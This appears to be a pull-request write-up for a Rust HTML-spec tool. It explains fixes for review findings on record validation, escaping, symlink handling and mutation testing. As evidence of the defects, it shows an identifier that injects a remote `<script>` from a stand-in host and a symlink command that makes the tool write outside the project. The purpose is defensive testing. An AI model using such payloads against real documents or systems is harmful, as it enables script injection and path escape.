# The fourteen findings, fixed — and the one regression the fixes introduced

Two reviews of PR #31 found twelve issues; the sweep in `the-sweep-2026-09-20.md` found four more.
All of them are fixed here. **The structure of the fix matters more than the count**, and it is two
things: one reordering that collapsed three findings, and one shared escaping pair that collapsed
three more.

`0.14.0` is unchanged — these are fixes within this change's release, not a new one. **No spec delta
was edited**, and the one finding that could have needed one is settled below in the code's favour.

## The reordering: compose, validate, then write

Three findings were one defect. The record was written at line 138 and validated at line 168, so:

- an invalid record landed on disk;
- the existing-record refusal then fired on the retry, **wedging the run with no route back through
  the CLI**;
- the `--json` payload announced `started a run` on a process that exited 2;
- and a record carrying an injected remote script existed as a file somebody could open.

Reordering fixes all four and makes the promise the comment already stated actually true. Measured
after:

```
$ htmlspec --json run rb --as w      # runbook has a requirement with no id
json exit=2, stdout empty
record on disk after failure: runs/ does not exist
$ # fix the runbook, retry the same name
$ htmlspec run rb --as w             exit 0, record written
```

**The failure message also changed, because it was blaming the wrong thing.** It said *"a defect in
the copy rather than in the runbook"* — and in every case produced, the fault is in the runbook: a
requirement with no identifier, two identifiers colliding, markup inside one. The copy is faithful;
that is the point of it. It now names the runbook and lists the three causes, because that is what the
contributor can act on.

## The escaping: one pair, in one place

`runs.rs` had its own `escape_text` and **no attribute counterpart at all**, while
`htmlspec-assets/src/lib.rs` has had both since `render_kind` needed them. That is the
stated-once-applied-once pattern at the level of the *helper*, and it is why a reviewer reading
`runs.rs` for missing `escape_text` calls could not see the attribute sites: the tool for them did not
exist in the file.

**Fix:** `escape_text` and `escape_attribute` are now `pub` in `htmlspec-assets`, with a doc comment
recording why, and `runs.rs`'s half-copy is deleted. Three sites the review named one of:

| Site | Escape | Was |
| --- | --- | --- |
| the copied id, into element content | `escape_text` | **raw** — finding 1 |
| the copied id, into `data-refs` | `escape_attribute` | **raw** — found by the sweep |
| the derived `verify-*` id, both | both | **raw** — found by the sweep |

Measured before: an identifier of `req-x<script src=https://evil.example/x.js></script>y` produced
**three** live `<script src="https://evil.example/x.js">` elements. After: the schema's identifier
pattern refuses it first, so the record is never composed — and the escaping is pinned at the
composition layer by a unit test, because the pattern is a second line of defence and not the one
under test. If a future unit type took a freer identifier, the escaping is what stands between a
runbook and a live remote script in a document whose contract is that it renders offline.

**One assertion in that test was wrong at first and the correction is worth recording.** It searched
the output for `onload="` — which appears legitimately inside the *escaped content*, so it reported a
defect that was not there. Whether a second attribute exists is a question only the parser can answer,
so the test parses the result and asks the tree. A substring search over markup is the same mistake
`identifier_of` was making one function away.

## `symlink_metadata` over `Path::exists`

`commands.rs:754` explains this in the project's own words: `Path::exists` follows symlinks and
reports `false` for a broken one, which is how the archival guard failed open a third time.

Measured before, and the exit code is the part that makes it dangerous:

```
$ ln -s ../../../../../ESCAPED.html runs/x.html
$ htmlspec run rb --as x
/private/tmp/f2/htmlspec/runbooks/rb/runs/x.html: started a run of rb     exit 0
$ ls -la /tmp/ESCAPED.html
-rw-r--r--  4775  /tmp/ESCAPED.html
```

**Exit 0 and a success report**, so a test reading the exit status would have passed. The regression
test asserts the file outside the project does not exist.

After: refused, with a message that names a symlink specifically rather than folding it into "already
exists" — the two call for different actions, and nothing in this program creates a symlink there. The
three arms are `refuse_a_runbook`'s: `NotFound` proceeds, anything present refuses, any other I/O
error refuses rather than reading as permission.

**One instance of this defect is pre-existing and not fixed here.** `write_document` at
`commands.rs:577` has the identical `path.exists()`, and `htmlspec new document` writes outside the
project through a broken symlink — measured, on the unmodified binary, before any of this change's
code. It is on the path of `new document` and `new change`, neither of which this change touches, so
fixing it needs its own regression tests through both commands. **Reported rather than folded in.**

## The recovery gate, on both documents and on the read path

Applied to `tasks.html` and not to `specification.html` twelve lines below it. Factored into
`recovery_free` so a third document cannot be parsed here without passing through it. And extended to
the two read-path sites the sweep found — `--check` was reading each record without the gate, so a
record with more than one reading had one picked silently.

### The regression this fix introduced, and how it was caught

**Extending the gate to the contract made a runbook with no specification unrunnable**, which
`runbook-authority` explicitly allows. The cause: the contract was read with `unwrap_or_default()`, so
an *absent* document became an *empty* one — and the empty string needs error recovery. Measured:

```
$ htmlspec validate /tmp/empty.html
1 error: the document produced 1 recovered parse error(s)
```

Two existing tests caught it — `a_runbook_stating_nothing_has_runs_nothing_checks` and
`the_records_summary_does_not_describe_an_absent_section` — which is the suite doing its job on a fix
rather than on the original code. Fixed by making the contract an `Option<String>` on both paths, so
the gate asks its question only where there is a document to ask it about.

## Finding 9: the contract was right and the code was wrong

`runbook-execution` requires a record to carry *"the runbook's procedure, copied"*, and the record's
own summary claims the steps are copied as they stood. Copying only the task units made both false.

Measured against this repository's real release runbook: the record carried the four task units and
dropped `hs-what-this-consumes`, the section stating that the procedure needs `cargo`, `python3`,
`git`, a clean tree, and **a repository that is not already an html-spec project** — a hazard this
project discovered by violating it. So the dropped content was the most valuable prose in the document.

**Narrowing the requirement was the alternative and it is worse.** The input gap this change records
means prose is the *only* place a prerequisite can live, so a record that cannot carry it cannot answer
what the run consumed. The code now copies the whole of the procedure's `main` content.

**That also fixed finding 12 for free.** The invented `<ul>` wrapper is gone, because the runbook's own
list structure now comes across intact — so a procedure whose steps are `<section>` elements no longer
lands inside a `<ul>` that nothing validates.

## Finding 11 is worse than reported, and the fix is exclusion

The review called the unconditional rewrite wrong for `removed`. It is worse than a contradiction
between two attributes. `document.schema.json` states that for a removed unit *"no reference may
target it"*, and `refs/removed-target` is an **error**:

> `this {} references {target}, which this change withdraws. Work cannot target an obligation that is
> being removed`

So both branches are wrong. Rewriting to `unchanged` produces `data-change="unchanged"` beside a
`data-reason` saying the unit is withdrawn; preserving `removed` makes the verification the record
writes refuse the whole record. **The unit is excluded**: a run cannot attest to an obligation that no
longer applies.

**And the fix reproduced the pattern it was fixing.** Excluding it on the write path and not the read
path left `--check` demanding an outcome for a requirement the record was right not to carry —
measured as `1 unrecorded requirement(s)` against a record holding zero requirements. Both paths now
go through one `is_withdrawn`, which reads the state out of the schema by stem exactly as
`rules::review`'s `material_states` does.

## The smaller ones

**Finding 3, `trim_start_matches`:** strips *every* repetition, so `req-real` and `req-req-real` both
yielded `verify-real` and a runbook holding the pair produced a record failing
`schema/duplicate-id`. Both identifiers are schema-legal. `strip_prefix` asks the right question.

**Finding 4, `identifier_of`:** returned the first ` id="` anywhere in the serialized subtree, so a
requirement with no identifier silently yielded its *scenario's* — measured as
`data-refs="scenario-real"`. The tree already knows which element owns the attribute, so it is asked;
the textual search is deleted rather than repaired, which is what the review suggested considering.

**Finding 5, the typo'd outcome:** `has_run` asked only "is this not the not-run value", which an
unenumerated string answers `true` — so `data-outcome="notrun"` reported conformance. It now requires
the outcome to be one the schema **enumerates**, with no literal introduced: the vocabulary and its
not-run member both still come from the schema.

**Finding 6, the unreadable record:** `filter_map(... .ok()?)` turned a record that could not be read
into an absent one, so `checking 0 run(s)` / `has no runs on record` — byte-identical to a runbook
nobody ran. `gather` now returns a `Found` sum type, `--check` names each unreadable record and
excludes it, and the silent case distinguishes "no records" from "records, none readable". The
precedent supports this: `commands.rs`'s `completion` returns `None` for an unreadable document and the
enumeration reports *a change with no tasks document* rather than no change.

**Finding 13, the zero summary:** read "The 0 requirements below are copied" with no requirements
section present — and that string is the document's projected `summary`. Three cases now, and the zero
case says why there is nothing to attest to.

**Finding 14, the over-broad test filter:** the test that pins "validation is silent about the short
record" filtered out the entire `Review` namespace, so the widening its own doc comment says it would
catch would have been filtered too. Narrowed to `review/example-content`, which is the one rule
inherited from the generated base and reported by `valid-minimal` as well.

## Mutation testing: eleven mutations, all caught

Each alone, reverted between. Verified by diffing the file against a clean copy afterwards.

| # | Mutation | Failed |
| --- | --- | --- |
| 11 | `exists()` before the `symlink_metadata` match | `a_symlink_at_the_record_path_does_not_escape_the_project` |
| 12 | write before validate | `a_record_that_does_not_validate_is_not_written_and_does_not_wedge_the_run` |
| 13 | copied id interpolated raw | `a_requirement_identifier_carrying_markup_is_escaped_everywhere_it_lands` |
| 14 | `trim_start_matches` restored | `a_repeated_requirement_prefix_is_not_stripped_twice` |
| 15 | id read back from serialized markup | `a_unit_with_no_identifier_does_not_borrow_its_childs` |
| 16 | `has_run` drops the enumerated check | `only_an_outcome_the_schema_enumerates_counts_as_recorded` |
| 17 | unreadable records dropped | `a_record_that_cannot_be_read_is_not_an_absent_record` |
| 18 | no recovery gate on the read path | `a_record_whose_markup_needs_recovery_is_excluded_from_the_report` |
| 19 | only task units copied | `the_record_carries_the_procedures_prose` |
| 20 | withdrawn units copied, both paths | `a_withdrawn_requirement_is_carried_by_neither_path` |
| 21 | the zero summary counts to zero | `the_summary_does_not_describe_requirements_that_are_absent` |

**Two mutations silently failed to apply on the first attempt** — a Python string that did not match
the file, so the test run was against unmutated code and reported "caught nothing". Both re-run with
an `assert` on the pattern, and both then failed the expected test. Worth recording because it is the
same failure mode as a test passing for the wrong reason, one level up: **a mutation that does not
apply proves nothing and looks like proof.**
